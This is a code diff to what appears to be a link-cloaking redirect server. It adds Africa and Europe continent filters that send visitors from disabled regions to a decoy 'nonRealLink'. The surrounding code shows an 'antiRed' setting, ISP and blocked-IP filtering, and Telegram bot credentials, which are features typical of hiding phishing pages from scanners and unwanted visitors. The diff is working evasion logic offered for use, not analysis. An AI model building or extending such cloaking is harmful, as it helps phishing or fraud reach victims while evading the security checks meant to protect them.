@@ -859,9 +859,11 @@ const SETTINGS_ALLOWED_KEYS = new Set([
     'reallowVisited',
     'mobileIsps',
     'botToken',
-    'chatId'
+    'chatId',
+    'allowAfrica',
+    'allowEurope'
 ]);
-const SETTINGS_BOOLEAN_KEYS = new Set(['antiRed', 'ispFilter', 'reallowVisited']);
+const SETTINGS_BOOLEAN_KEYS = new Set(['antiRed', 'ispFilter', 'reallowVisited', 'allowAfrica', 'allowEurope']);
 const SETTINGS_LIST_KEYS = new Set(['mobileIsps']);
 
 app.post('/api/settings', requireAuth, apiLimiter, asyncHandler(async (req, res) => {
@@ -1820,6 +1822,8 @@ async function handleRedirection(user, req, res, linkData) {
     const useIspFilter = linkData.ispFilter !== undefined ? linkData.ispFilter : settings.ispFilter;
     const useMobileIsps = linkData.mobileIsps || settings.mobileIsps;
     const useReallowVisited = linkData.reallowVisited !== undefined ? linkData.reallowVisited : settings.reallowVisited;
+    const useAllowAfrica = settings.allowAfrica !== undefined ? settings.allowAfrica : false;
+    const useAllowEurope = settings.allowEurope !== undefined ? settings.allowEurope : true;
 
     // 0c. Blocked IP Check (user-level - deny before any other logic)
     if ((blockedIps || []).includes(clientIp)) {
@@ -1849,6 +1853,17 @@ async function handleRedirection(user, req, res, linkData) {
         const candidates = [data.isp, data.org].filter(Boolean);
         if (candidates.some(c => ispMatchesAnyBlock(c, adminBlocks.isps))) {
             return res.status(403).send('Access denied by administrator.');
+        }
+    }
+
+    // 3b. Continent Filtering (Africa / Europe)
+    if (data && data.status === 'success') {
+        const continent = data.continentCode; // 'AF', 'EU', 'NA', 'AS', 'SA', 'OC', 'AN'
+        if (!useAllowAfrica && continent === 'AF') {
+            return res.redirect(nonRealLink);
+        }
+        if (!useAllowEurope && continent === 'EU') {
+            return res.redirect(nonRealLink);
         }
     }
 
